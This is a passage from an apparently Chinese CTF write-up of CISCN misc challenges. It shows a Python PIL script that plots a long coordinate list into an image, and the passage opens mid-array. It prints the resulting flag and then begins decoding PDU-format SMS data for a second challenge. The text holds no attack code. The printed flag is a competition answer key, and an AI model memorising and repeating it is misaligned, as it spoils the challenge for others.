class="number">116</span>, <span class="number">55</span>],</span><br><span class="line">    [<span class="number">117</span>, <span class="number">56</span>], [<span class="number">118</span>, <span class="number">57</span>], [<span class="number">120</span>, <span class="number">57</span>], [<span class="number">122</span>, <span class="number">57</span>], [<span class="number">124</span>, <span class="number">57</span>], [<span class="number">126</span>, <span class="number">57</span>], [<span class="number">128</span>, <span class="number">57</span>], [<span class="number">131</span>, <span class="number">57</span>], [<span class="number">133</span>, <span class="number">57</span>],</span><br><span class="line">    [<span class="number">136</span>, <span class="number">57</span>], [<span class="number">138</span>, <span class="number">57</span>], [<span class="number">141</span>, <span class="number">57</span>], [<span class="number">143</span>, <span class="number">56</span>], [<span class="number">145</span>, <span class="number">55</span>], [<span class="number">147</span>, <span class="number">53</span>], [<span class="number">149</span>, <span class="number">52</span>], [<span class="number">150</span>, <span class="number">52</span>], [<span class="number">152</span>, <span class="number">50</span>],</span><br><span class="line">    [<span class="number">153</span>, <span class="number">49</span>], [<span class="number">155</span>, <span class="number">47</span>], [<span class="number">156</span>, <span class="number">46</span>], [<span class="number">157</span>, <span class="number">45</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">212</span>, <span class="number">24</span>], [<span class="number">213</span>, <span class="number">23</span>], [<span class="number">211</span>, <span class="number">21</span>], [<span class="number">210</span>, <span class="number">20</span>],</span><br><span class="line">    [<span class="number">209</span>, <span class="number">19</span>], [<span class="number">208</span>, <span class="number">18</span>], [<span class="number">207</span>, <span class="number">17</span>], [<span class="number">206</span>, <span class="number">16</span>], [<span class="number">205</span>, <span class="number">15</span>], [<span class="number">204</span>, <span class="number">15</span>], [<span class="number">201</span>, <span class="number">14</span>], [<span class="number">200</span>, <span class="number">14</span>], [<span class="number">199</span>, <span class="number">14</span>],</span><br><span class="line">    [<span class="number">197</span>, <span class="number">14</span>], [<span class="number">196</span>, <span class="number">14</span>], [<span class="number">195</span>, <span class="number">14</span>], [<span class="number">193</span>, <span class="number">14</span>], [<span class="number">191</span>, <span class="number">14</span>], [<span class="number">189</span>, <span class="number">16</span>], [<span class="number">188</span>, <span class="number">16</span>], [<span class="number">187</span>, <span class="number">16</span>], [<span class="number">186</span>, <span class="number">17</span>],</span><br><span class="line">    [<span class="number">185</span>, <span class="number">17</span>], [<span class="number">183</span>, <span class="number">18</span>], [<span class="number">183</span>, <span class="number">20</span>], [<span class="number">183</span>, <span class="number">21</span>], [<span class="number">182</span>, <span class="number">22</span>], [<span class="number">182</span>, <span class="number">23</span>], [<span class="number">182</span>, <span class="number">24</span>], [<span class="number">182</span>, <span class="number">25</span>], [<span class="number">182</span>, <span class="number">26</span>],</span><br><span class="line">    [<span class="number">182</span>, <span class="number">27</span>], [<span class="number">182</span>, <span class="number">29</span>], [<span class="number">183</span>, <span class="number">31</span>], [<span class="number">184</span>, <span class="number">32</span>], [<span class="number">186</span>, <span class="number">33</span>], [<span class="number">187</span>, <span class="number">34</span>], [<span class="number">188</span>, <span class="number">34</span>], [<span class="number">189</span>, <span class="number">35</span>], [<span class="number">190</span>, <span class="number">35</span>],</span><br><span class="line">    [<span class="number">192</span>, <span class="number">36</span>], [<span class="number">194</span>, <span class="number">37</span>], [<span class="number">196</span>, <span class="number">37</span>], [<span class="number">198</span>, <span class="number">38</span>], [<span class="number">199</span>, <span class="number">38</span>], [<span class="number">200</span>, <span class="number">38</span>], [<span class="number">201</span>, <span class="number">38</span>], [<span class="number">202</span>, <span class="number">39</span>], [<span class="number">203</span>, <span class="number">39</span>],</span><br><span class="line">    [<span class="number">204</span>, <span class="number">40</span>], [<span class="number">207</span>, <span class="number">41</span>], [<span class="number">207</span>, <span class="number">42</span>], [<span class="number">208</span>, <span class="number">43</span>], [<span class="number">208</span>, <span class="number">44</span>], [<span class="number">208</span>, <span class="number">45</span>], [<span class="number">208</span>, <span class="number">46</span>], [<span class="number">208</span>, <span class="number">48</span>], [<span class="number">208</span>, <span class="number">50</span>],</span><br><span class="line">    [<span class="number">208</span>, <span class="number">51</span>], [<span class="number">207</span>, <span class="number">53</span>], [<span class="number">207</span>, <span class="number">54</span>], [<span class="number">206</span>, <span class="number">56</span>], [<span class="number">204</span>, <span class="number">58</span>], [<span class="number">203</span>, <span class="number">60</span>], [<span class="number">202</span>, <span class="number">61</span>], [<span class="number">201</span>, <span class="number">62</span>], [<span class="number">201</span>, <span class="number">63</span>],</span><br><span class="line">    [<span class="number">200</span>, <span class="number">64</span>], [<span class="number">199</span>, <span class="number">64</span>], [<span class="number">198</span>, <span class="number">64</span>], [<span class="number">197</span>, <span class="number">65</span>], [<span class="number">196</span>, <span class="number">65</span>], [<span class="number">195</span>, <span class="number">65</span>], [<span class="number">193</span>, <span class="number">65</span>], [<span class="number">192</span>, <span class="number">65</span>], [<span class="number">190</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">189</span>, <span class="number">65</span>], [<span class="number">187</span>, <span class="number">65</span>], [<span class="number">185</span>, <span class="number">65</span>], [<span class="number">184</span>, <span class="number">65</span>], [<span class="number">183</span>, <span class="number">65</span>], [<span class="number">181</span>, <span class="number">64</span>], [<span class="number">180</span>, <span class="number">63</span>], [<span class="number">179</span>, <span class="number">63</span>], [<span class="number">178</span>, <span class="number">62</span>],</span><br><span class="line">    [<span class="number">177</span>, <span class="number">62</span>], [<span class="number">175</span>, <span class="number">61</span>], [<span class="number">174</span>, <span class="number">60</span>], [<span class="number">173</span>, <span class="number">59</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">243</span>, <span class="number">20</span>], [<span class="number">244</span>, <span class="number">19</span>], [<span class="number">244</span>, <span class="number">21</span>], [<span class="number">244</span>, <span class="number">25</span>],</span><br><span class="line">    [<span class="number">245</span>, <span class="number">26</span>], [<span class="number">245</span>, <span class="number">29</span>], [<span class="number">247</span>, <span class="number">32</span>], [<span class="number">247</span>, <span class="number">34</span>], [<span class="number">248</span>, <span class="number">36</span>], [<span class="number">248</span>, <span class="number">37</span>], [<span class="number">249</span>, <span class="number">39</span>], [<span class="number">250</span>, <span class="number">40</span>], [<span class="number">251</span>, <span class="number">42</span>],</span><br><span class="line">    [<span class="number">251</span>, <span class="number">43</span>], [<span class="number">252</span>, <span class="number">44</span>], [<span class="number">254</span>, <span class="number">44</span>], [<span class="number">256</span>, <span class="number">44</span>], [<span class="number">258</span>, <span class="number">44</span>], [<span class="number">260</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">41</span>], [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">265</span>, <span class="number">38</span>],</span><br><span class="line">    [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">267</span>, <span class="number">32</span>], [<span class="number">268</span>, <span class="number">30</span>], [<span class="number">271</span>, <span class="number">27</span>], [<span class="number">272</span>, <span class="number">25</span>], [<span class="number">273</span>, <span class="number">22</span>], [<span class="number">274</span>, <span class="number">21</span>], [<span class="number">275</span>, <span class="number">20</span>], [<span class="number">275</span>, <span class="number">19</span>],</span><br><span class="line">    [<span class="number">274</span>, <span class="number">18</span>], [<span class="number">274</span>, <span class="number">20</span>], [<span class="number">272</span>, <span class="number">22</span>], [<span class="number">271</span>, <span class="number">23</span>], [<span class="number">271</span>, <span class="number">26</span>], [<span class="number">268</span>, <span class="number">29</span>], [<span class="number">266</span>, <span class="number">33</span>], [<span class="number">266</span>, <span class="number">35</span>], [<span class="number">265</span>, <span class="number">37</span>],</span><br><span class="line">    [<span class="number">263</span>, <span class="number">40</span>], [<span class="number">262</span>, <span class="number">42</span>], [<span class="number">262</span>, <span class="number">44</span>], [<span class="number">261</span>, <span class="number">47</span>], [<span class="number">260</span>, <span class="number">49</span>], [<span class="number">259</span>, <span class="number">51</span>], [<span class="number">258</span>, <span class="number">55</span>], [<span class="number">258</span>, <span class="number">56</span>], [<span class="number">257</span>, <span class="number">58</span>],</span><br><span class="line">    [<span class="number">255</span>, <span class="number">61</span>], [<span class="number">254</span>, <span class="number">62</span>], [<span class="number">253</span>, <span class="number">63</span>], [<span class="number">253</span>, <span class="number">64</span>], [<span class="number">252</span>, <span class="number">65</span>], [<span class="number">251</span>, <span class="number">66</span>], [<span class="number">250</span>, <span class="number">67</span>], [<span class="number">249</span>, <span class="number">68</span>], [<span class="number">248</span>, <span class="number">69</span>],</span><br><span class="line">    [<span class="number">247</span>, <span class="number">70</span>], [<span class="number">246</span>, <span class="number">71</span>], [<span class="number">245</span>, <span class="number">72</span>], [<span class="number">244</span>, <span class="number">73</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">298</span>, <span class="number">64</span>], [<span class="number">299</span>, <span class="number">65</span>], [<span class="number">300</span>, <span class="number">65</span>], [<span class="number">302</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">304</span>, <span class="number">65</span>], [<span class="number">306</span>, <span class="number">65</span>], [<span class="number">308</span>, <span class="number">65</span>], [<span class="number">309</span>, <span class="number">65</span>], [<span class="number">312</span>, <span class="number">65</span>], [<span class="number">315</span>, <span class="number">65</span>], [<span class="number">317</span>, <span class="number">65</span>], [<span class="number">319</span>, <span class="number">65</span>], [<span class="number">322</span>, <span class="number">65</span>],</span><br><span class="line">    [<span class="number">325</span>, <span class="number">65</span>], [<span class="number">327</span>, <span class="number">65</span>], [<span class="number">330</span>, <span class="number">65</span>], [<span class="number">332</span>, <span class="number">65</span>], [<span class="number">334</span>, <span class="number">66</span>], [<span class="number">335</span>, <span class="number">66</span>], [<span class="number">20</span>, <span class="number">103</span>], [<span class="number">20</span>, <span class="number">104</span>], [<span class="number">20</span>, <span class="number">107</span>],</span><br><span class="line">    [<span class="number">20</span>, <span class="number">110</span>], [<span class="number">20</span>, <span class="number">112</span>], [<span class="number">20</span>, <span class="number">114</span>], [<span class="number">20</span>, <span class="number">118</span>], [<span class="number">19</span>, <span class="number">121</span>], [<span class="number">18</span>, <span class="number">124</span>], [<span class="number">17</span>, <span class="number">126</span>], [<span class="number">17</span>, <span class="number">130</span>], [<span class="number">17</span>, <span class="number">134</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">137</span>], [<span class="number">17</span>, <span class="number">139</span>], [<span class="number">17</span>, <span class="number">142</span>], [<span class="number">17</span>, <span class="number">143</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">17</span>, <span class="number">147</span>], [<span class="number">17</span>, <span class="number">149</span>], [<span class="number">17</span>, <span class="number">150</span>], [<span class="number">17</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">17</span>, <span class="number">148</span>], [<span class="number">17</span>, <span class="number">146</span>], [<span class="number">18</span>, <span class="number">145</span>], [<span class="number">18</span>, <span class="number">143</span>], [<span class="number">19</span>, <span class="number">142</span>], [<span class="number">20</span>, <span class="number">141</span>], [<span class="number">20</span>, <span class="number">140</span>], [<span class="number">21</span>, <span class="number">138</span>], [<span class="number">21</span>, <span class="number">137</span>],</span><br><span class="line">    [<span class="number">22</span>, <span class="number">135</span>], [<span class="number">23</span>, <span class="number">134</span>], [<span class="number">24</span>, <span class="number">132</span>], [<span class="number">25</span>, <span class="number">131</span>], [<span class="number">26</span>, <span class="number">129</span>], [<span class="number">27</span>, <span class="number">128</span>], [<span class="number">28</span>, <span class="number">127</span>], [<span class="number">29</span>, <span class="number">126</span>], [<span class="number">31</span>, <span class="number">125</span>],</span><br><span class="line">    [<span class="number">32</span>, <span class="number">124</span>], [<span class="number">32</span>, <span class="number">123</span>], [<span class="number">34</span>, <span class="number">121</span>], [<span class="number">35</span>, <span class="number">120</span>], [<span class="number">37</span>, <span class="number">120</span>], [<span class="number">38</span>, <span class="number">119</span>], [<span class="number">40</span>, <span class="number">118</span>], [<span class="number">41</span>, <span class="number">118</span>], [<span class="number">43</span>, <span class="number">117</span>],</span><br><span class="line">    [<span class="number">44</span>, <span class="number">116</span>], [<span class="number">46</span>, <span class="number">115</span>], [<span class="number">48</span>, <span class="number">115</span>], [<span class="number">49</span>, <span class="number">114</span>], [<span class="number">50</span>, <span class="number">113</span>], [<span class="number">51</span>, <span class="number">113</span>], [<span class="number">52</span>, <span class="number">112</span>], [<span class="number">80</span>, <span class="number">121</span>], [<span class="number">80</span>, <span class="number">121</span>],</span><br><span class="line">    [<span class="number">79</span>, <span class="number">120</span>], [<span class="number">78</span>, <span class="number">121</span>], [<span class="number">77</span>, <span class="number">122</span>], [<span class="number">77</span>, <span class="number">123</span>], [<span class="number">77</span>, <span class="number">124</span>], [<span class="number">76</span>, <span class="number">127</span>], [<span class="number">75</span>, <span class="number">128</span>], [<span class="number">74</span>, <span class="number">129</span>], [<span class="number">73</span>, <span class="number">131</span>],</span><br><span class="line">    [<span class="number">73</span>, <span class="number">132</span>], [<span class="number">73</span>, <span class="number">133</span>], [<span class="number">72</span>, <span class="number">135</span>], [<span class="number">72</span>, <span class="number">136</span>], [<span class="number">72</span>, <span class="number">137</span>], [<span class="number">72</span>, <span class="number">138</span>], [<span class="number">72</span>, <span class="number">139</span>], [<span class="number">72</span>, <span class="number">140</span>], [<span class="number">72</span>, <span class="number">142</span>],</span><br><span class="line">    [<span class="number">72</span>, <span class="number">144</span>], [<span class="number">72</span>, <span class="number">145</span>], [<span class="number">73</span>, <span class="number">148</span>], [<span class="number">74</span>, <span class="number">149</span>], [<span class="number">77</span>, <span class="number">150</span>], [<span class="number">78</span>, <span class="number">150</span>], [<span class="number">80</span>, <span class="number">151</span>], [<span class="number">81</span>, <span class="number">151</span>], [<span class="number">82</span>, <span class="number">151</span>],</span><br><span class="line">    [<span class="number">83</span>, <span class="number">151</span>], [<span class="number">84</span>, <span class="number">151</span>], [<span class="number">85</span>, <span class="number">151</span>], [<span class="number">87</span>, <span class="number">151</span>], [<span class="number">89</span>, <span class="number">151</span>], [<span class="number">90</span>, <span class="number">151</span>], [<span class="number">92</span>, <span class="number">150</span>], [<span class="number">93</span>, <span class="number">150</span>], [<span class="number">95</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">97</span>, <span class="number">147</span>], [<span class="number">98</span>, <span class="number">146</span>], [<span class="number">99</span>, <span class="number">146</span>], [<span class="number">100</span>, <span class="number">145</span>], [<span class="number">101</span>, <span class="number">144</span>], [<span class="number">102</span>, <span class="number">142</span>], [<span class="number">102</span>, <span class="number">141</span>], [<span class="number">104</span>, <span class="number">139</span>],</span><br><span class="line">    [<span class="number">104</span>, <span class="number">138</span>], [<span class="number">105</span>, <span class="number">136</span>], [<span class="number">105</span>, <span class="number">135</span>], [<span class="number">105</span>, <span class="number">133</span>], [<span class="number">105</span>, <span class="number">132</span>], [<span class="number">105</span>, <span class="number">131</span>], [<span class="number">105</span>, <span class="number">129</span>], [<span class="number">104</span>, <span class="number">128</span>],</span><br><span class="line">    [<span class="number">103</span>, <span class="number">126</span>], [<span class="number">102</span>, <span class="number">126</span>], [<span class="number">101</span>, <span class="number">125</span>], [<span class="number">98</span>, <span class="number">123</span>], [<span class="number">96</span>, <span class="number">123</span>], [<span class="number">95</span>, <span class="number">123</span>], [<span class="number">93</span>, <span class="number">123</span>], [<span class="number">92</span>, <span class="number">122</span>], [<span class="number">90</span>, <span class="number">121</span>],</span><br><span class="line">    [<span class="number">89</span>, <span class="number">121</span>], [<span class="number">86</span>, <span class="number">120</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">147</span>, <span class="number">98</span>], [<span class="number">146</span>, <span class="number">99</span>], [<span class="number">145</span>, <span class="number">100</span>], [<span class="number">144</span>, <span class="number">103</span>], [<span class="number">143</span>, <span class="number">104</span>],</span><br><span class="line">    [<span class="number">142</span>, <span class="number">105</span>], [<span class="number">142</span>, <span class="number">106</span>], [<span class="number">142</span>, <span class="number">109</span>], [<span class="number">142</span>, <span class="number">111</span>], [<span class="number">142</span>, <span class="number">114</span>], [<span class="number">141</span>, <span class="number">118</span>], [<span class="number">140</span>, <span class="number">120</span>], [<span class="number">139</span>, <span class="number">123</span>],</span><br><span class="line">    [<span class="number">138</span>, <span class="number">127</span>], [<span class="number">138</span>, <span class="number">129</span>], [<span class="number">137</span>, <span class="number">133</span>], [<span class="number">135</span>, <span class="number">135</span>], [<span class="number">134</span>, <span class="number">137</span>], [<span class="number">133</span>, <span class="number">139</span>], [<span class="number">131</span>, <span class="number">142</span>], [<span class="number">131</span>, <span class="number">143</span>],</span><br><span class="line">    [<span class="number">131</span>, <span class="number">145</span>], [<span class="number">130</span>, <span class="number">146</span>], [<span class="number">129</span>, <span class="number">149</span>], [<span class="number">128</span>, <span class="number">152</span>], [<span class="number">128</span>, <span class="number">153</span>], [<span class="number">127</span>, <span class="number">156</span>], [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">126</span>, <span class="number">158</span>],</span><br><span class="line">    [<span class="number">127</span>, <span class="number">157</span>], [<span class="number">129</span>, <span class="number">157</span>], [<span class="number">130</span>, <span class="number">156</span>], [<span class="number">132</span>, <span class="number">156</span>], [<span class="number">134</span>, <span class="number">155</span>], [<span class="number">137</span>, <span class="number">153</span>], [<span class="number">138</span>, <span class="number">152</span>], [<span class="number">139</span>, <span class="number">151</span>],</span><br><span class="line">    [<span class="number">140</span>, <span class="number">150</span>], [<span class="number">143</span>, <span class="number">149</span>], [<span class="number">144</span>, <span class="number">148</span>], [<span class="number">145</span>, <span class="number">147</span>], [<span class="number">146</span>, <span class="number">146</span>], [<span class="number">147</span>, <span class="number">145</span>], [<span class="number">149</span>, <span class="number">144</span>], [<span class="number">149</span>, <span class="number">143</span>],</span><br><span class="line">    [<span class="number">150</span>, <span class="number">142</span>], [<span class="number">151</span>, <span class="number">141</span>], [<span class="number">152</span>, <span class="number">140</span>], [<span class="number">152</span>, <span class="number">139</span>], [<span class="number">153</span>, <span class="number">138</span>], [<span class="number">153</span>, <span class="number">137</span>], [<span class="number">153</span>, <span class="number">136</span>], [<span class="number">153</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">153</span>, <span class="number">134</span>], [<span class="number">153</span>, <span class="number">133</span>], [<span class="number">152</span>, <span class="number">132</span>], [<span class="number">151</span>, <span class="number">131</span>], [<span class="number">150</span>, <span class="number">131</span>], [<span class="number">149</span>, <span class="number">130</span>], [<span class="number">147</span>, <span class="number">129</span>], [<span class="number">186</span>, <span class="number">136</span>],</span><br><span class="line">    [<span class="number">186</span>, <span class="number">136</span>], [<span class="number">183</span>, <span class="number">137</span>], [<span class="number">182</span>, <span class="number">138</span>], [<span class="number">182</span>, <span class="number">139</span>], [<span class="number">182</span>, <span class="number">140</span>], [<span class="number">181</span>, <span class="number">142</span>], [<span class="number">179</span>, <span class="number">144</span>], [<span class="number">179</span>, <span class="number">145</span>],</span><br><span class="line">    [<span class="number">179</span>, <span class="number">147</span>], [<span class="number">178</span>, <span class="number">149</span>], [<span class="number">177</span>, <span class="number">150</span>], [<span class="number">177</span>, <span class="number">151</span>], [<span class="number">177</span>, <span class="number">152</span>], [<span class="number">177</span>, <span class="number">154</span>], [<span class="number">177</span>, <span class="number">156</span>], [<span class="number">177</span>, <span class="number">157</span>],</span><br><span class="line">    [<span class="number">177</span>, <span class="number">158</span>], [<span class="number">178</span>, <span class="number">160</span>], [<span class="number">179</span>, <span class="number">161</span>], [<span class="number">180</span>, <span class="number">162</span>], [<span class="number">181</span>, <span class="number">163</span>], [<span class="number">182</span>, <span class="number">164</span>], [<span class="number">184</span>, <span class="number">164</span>], [<span class="number">186</span>, <span class="number">164</span>],</span><br><span class="line">    [<span class="number">187</span>, <span class="number">164</span>], [<span class="number">188</span>, <span class="number">164</span>], [<span class="number">190</span>, <span class="number">163</span>], [<span class="number">191</span>, <span class="number">162</span>], [<span class="number">192</span>, <span class="number">162</span>], [<span class="number">194</span>, <span class="number">160</span>], [<span class="number">196</span>, <span class="number">159</span>], [<span class="number">197</span>, <span class="number">158</span>],</span><br><span class="line">    [<span class="number">197</span>, <span class="number">156</span>], [<span class="number">198</span>, <span class="number">155</span>], [<span class="number">200</span>, <span class="number">153</span>], [<span class="number">200</span>, <span class="number">152</span>], [<span class="number">201</span>, <span class="number">150</span>], [<span class="number">201</span>, <span class="number">149</span>], [<span class="number">201</span>, <span class="number">148</span>], [<span class="number">201</span>, <span class="number">147</span>],</span><br><span class="line">    [<span class="number">201</span>, <span class="number">145</span>], [<span class="number">201</span>, <span class="number">144</span>], [<span class="number">201</span>, <span class="number">142</span>], [<span class="number">201</span>, <span class="number">141</span>], [<span class="number">201</span>, <span class="number">139</span>], [<span class="number">201</span>, <span class="number">138</span>], [<span class="number">200</span>, <span class="number">136</span>], [<span class="number">199</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">198</span>, <span class="number">135</span>], [<span class="number">197</span>, <span class="number">135</span>], [<span class="number">196</span>, <span class="number">135</span>], [<span class="number">195</span>, <span class="number">135</span>], [<span class="number">193</span>, <span class="number">135</span>], [<span class="number">192</span>, <span class="number">135</span>], [<span class="number">190</span>, <span class="number">135</span>], [<span class="number">189</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">223</span>, <span class="number">167</span>], [<span class="number">224</span>, <span class="number">167</span>], [<span class="number">226</span>, <span class="number">167</span>], [<span class="number">228</span>, <span class="number">167</span>], [<span class="number">229</span>, <span class="number">167</span>], [<span class="number">232</span>, <span class="number">167</span>], [<span class="number">233</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">234</span>, <span class="number">167</span>], [<span class="number">235</span>, <span class="number">167</span>], [<span class="number">237</span>, <span class="number">167</span>], [<span class="number">238</span>, <span class="number">167</span>], [<span class="number">240</span>, <span class="number">167</span>], [<span class="number">241</span>, <span class="number">167</span>], [<span class="number">243</span>, <span class="number">167</span>], [<span class="number">244</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">246</span>, <span class="number">167</span>], [<span class="number">247</span>, <span class="number">167</span>], [<span class="number">250</span>, <span class="number">168</span>], [<span class="number">251</span>, <span class="number">168</span>], [<span class="number">252</span>, <span class="number">168</span>], [<span class="number">253</span>, <span class="number">168</span>], [<span class="number">254</span>, <span class="number">168</span>], [<span class="number">269</span>, <span class="number">135</span>],</span><br><span class="line">    [<span class="number">271</span>, <span class="number">136</span>], [<span class="number">273</span>, <span class="number">138</span>], [<span class="number">275</span>, <span class="number">140</span>], [<span class="number">276</span>, <span class="number">141</span>], [<span class="number">278</span>, <span class="number">143</span>], [<span class="number">280</span>, <span class="number">145</span>], [<span class="number">282</span>, <span class="number">147</span>], [<span class="number">284</span>, <span class="number">149</span>],</span><br><span class="line">    [<span class="number">285</span>, <span class="number">150</span>], [<span class="number">288</span>, <span class="number">152</span>], [<span class="number">289</span>, <span class="number">153</span>], [<span class="number">291</span>, <span class="number">154</span>], [<span class="number">293</span>, <span class="number">156</span>], [<span class="number">294</span>, <span class="number">157</span>], [<span class="number">296</span>, <span class="number">159</span>], [<span class="number">297</span>, <span class="number">160</span>],</span><br><span class="line">    [<span class="number">298</span>, <span class="number">161</span>], [<span class="number">299</span>, <span class="number">162</span>], [<span class="number">300</span>, <span class="number">136</span>], [<span class="number">299</span>, <span class="number">136</span>], [<span class="number">297</span>, <span class="number">137</span>], [<span class="number">296</span>, <span class="number">138</span>], [<span class="number">294</span>, <span class="number">141</span>], [<span class="number">294</span>, <span class="number">142</span>],</span><br><span class="line">    [<span class="number">293</span>, <span class="number">144</span>], [<span class="number">293</span>, <span class="number">145</span>], [<span class="number">292</span>, <span class="number">148</span>], [<span class="number">291</span>, <span class="number">149</span>], [<span class="number">290</span>, <span class="number">151</span>], [<span class="number">288</span>, <span class="number">153</span>], [<span class="number">288</span>, <span class="number">155</span>], [<span class="number">287</span>, <span class="number">156</span>],</span><br><span class="line">    [<span class="number">286</span>, <span class="number">157</span>], [<span class="number">285</span>, <span class="number">159</span>], [<span class="number">284</span>, <span class="number">160</span>], [<span class="number">283</span>, <span class="number">161</span>], [<span class="number">282</span>, <span class="number">162</span>], [<span class="number">281</span>, <span class="number">163</span>], [<span class="number">280</span>, <span class="number">164</span>], [<span class="number">279</span>, <span class="number">165</span>],</span><br><span class="line">    [<span class="number">327</span>, <span class="number">142</span>], [<span class="number">328</span>, <span class="number">143</span>], [<span class="number">330</span>, <span class="number">145</span>], [<span class="number">332</span>, <span class="number">148</span>], [<span class="number">333</span>, <span class="number">149</span>], [<span class="number">335</span>, <span class="number">151</span>], [<span class="number">337</span>, <span class="number">154</span>], [<span class="number">339</span>, <span class="number">156</span>],</span><br><span class="line">    [<span class="number">341</span>, <span class="number">158</span>], [<span class="number">342</span>, <span class="number">159</span>], [<span class="number">345</span>, <span class="number">160</span>], [<span class="number">347</span>, <span class="number">161</span>], [<span class="number">348</span>, <span class="number">162</span>], [<span class="number">350</span>, <span class="number">164</span>], [<span class="number">351</span>, <span class="number">165</span>], [<span class="number">352</span>, <span class="number">166</span>],</span><br><span class="line">    [<span class="number">355</span>, <span class="number">168</span>], [<span class="number">356</span>, <span class="number">169</span>], [<span class="number">351</span>, <span class="number">143</span>], [<span class="number">350</span>, <span class="number">143</span>], [<span class="number">348</span>, <span class="number">144</span>], [<span class="number">347</span>, <span class="number">144</span>], [<span class="number">346</span>, <span class="number">145</span>], [<span class="number">343</span>, <span class="number">148</span>],</span><br><span class="line">    [<span class="number">341</span>, <span class="number">150</span>], [<span class="number">339</span>, <span class="number">152</span>], [<span class="number">336</span>, <span class="number">155</span>], [<span class="number">333</span>, <span class="number">158</span>], [<span class="number">330</span>, <span class="number">159</span>], [<span class="number">327</span>, <span class="number">162</span>], [<span class="number">325</span>, <span class="number">165</span>], [<span class="number">323</span>, <span class="number">167</span>],</span><br><span class="line">    [<span class="number">322</span>, <span class="number">168</span>], [<span class="number">319</span>, <span class="number">170</span>], [<span class="number">317</span>, <span class="number">171</span>], [<span class="number">316</span>, <span class="number">171</span>], [<span class="number">314</span>, <span class="number">172</span>], [<span class="number">313</span>, <span class="number">172</span>]]</span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">357</span>, <span class="number">173</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">[image.putpixel((location[<span class="number">0</span>], location[<span class="number">1</span>]), (<span class="number">16</span>, <span class="number">63</span>, <span class="number">145</span>)) <span class="keyword">for</span> location <span class="keyword">in</span> pixelsLocations]</span><br><span class="line">image.save(<span class="string">&quot;result2.png&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得到如下图片，将其上内容转写后转换出其的 MD5 值即可得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621099954086/d82eb7033f149d096d3845f7b9924286350c5f61.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CISCN&#123;d4f1fb80bc11ffd722861367747c0f10&#125;</span><br></pre></td></tr></table></figure><h3 id="隔空传话"><a href="#隔空传话" class="headerlink" title="隔空传话"></a>隔空传话</h3><p>把附件内容稍微搜一下可以得到数据是 PDU 短信的数据。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621257298444/00afc51e45938d0bf34c4b21ce46d003e4fb06a4.png"></p><blockquote><p><a href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/</a></p></blockquote><p>将数据整理成 JavaScript 的数组形式，配合 <code>a.forEach(v =&gt; &#123;console.log(getPDUMetaInfo(v))&#125;)</code> 来得到所有数据的解析，这里贴上部分关键数据。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">SMSC#</span><br><span class="line">Receipient:+8615030442000</span><br><span class="line">Validity:Rel 4d </span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span class="line">TP_DCS-popis:Uncompressed Text</span><br><span class="line">No class</span><br><span class="line">Alphabet:Default</span><br><span class="line"></span><br><span class="line">hello,bob!what is the flag?</span><br><span class="line">Length:27</span><br><span class="line"></span><br><span class="line">SMSC#</span><br><span class="line">Receipient:+10086</span><br><span class="line">Validity:Not Present</span><br><span class="line">TP_PID:00</span><br><span class="line">TP_DCS:00</span><br><span 